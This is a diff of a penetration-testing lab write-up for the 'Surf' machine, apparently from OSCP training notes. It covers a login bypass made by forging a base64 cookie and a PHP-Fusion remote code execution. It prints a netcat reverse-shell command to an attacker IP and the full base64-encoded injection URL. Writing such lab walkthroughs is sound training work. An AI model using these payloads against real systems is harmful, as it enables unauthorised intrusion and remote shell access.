@@ -60,20 +60,54 @@ OS and Service detection performed. Please report any incorrect results at https
 
 After browsing a while, the website looks nothing interesting. We use feroxbuster to discover new content.
 
-##1
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h00m37s_001_.png)
 
 We find a administration directory that is a login page. Using hydra with username ```admin``` to try to brute force a valid credential but failed.
 
-##2
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h01m56s_002_.png)
 
 I use Burp Sutie for further analysis. There is an interesting setting in login page.
 
-##3
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h02m39s_003_.png)
 
 We decode auth_status base64 string and get a string ```{'success':'false'}```. 
 
-##4
+![iamge](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_11h03m30s_004_.png)
 
 Trying to modify it to bypass the login verification.
 
-##5
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_13h15m30s_005_.png)
+
+We log in successfully.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_13h19m42s_006_.png)
+
+The ```Check Server Status``` page can check that the server where is installed PHP-Fusion is correctly running.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_14h00m22s_007_.png)
+
+I found an RCE [vulnerability](https://www.exploit-db.com/exploits/49911) related to PHP-Fusion. Refer to the vulnerability description we create a new request payload to try to get the reverse shell.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_14h28m33s_008_.png)
+
+Encoding the connection string to base64 format and make sure to add spaces to avoid ```+``` or ```=```.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_15h49m48s_009_.png)
+
+```
+echo "nc -e /bin/bash 192.168.49.162 80  " | base64
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h07m15s_010_.png)
+
+We now combine request and base64 strings and modify the request url in Burp Suite.
+
+```
+http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_decode(bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTYyIDgwICAK))}
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h22m10s_011_.png)
+
+We get the shell successfully.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_16h31m46s_012_.png)
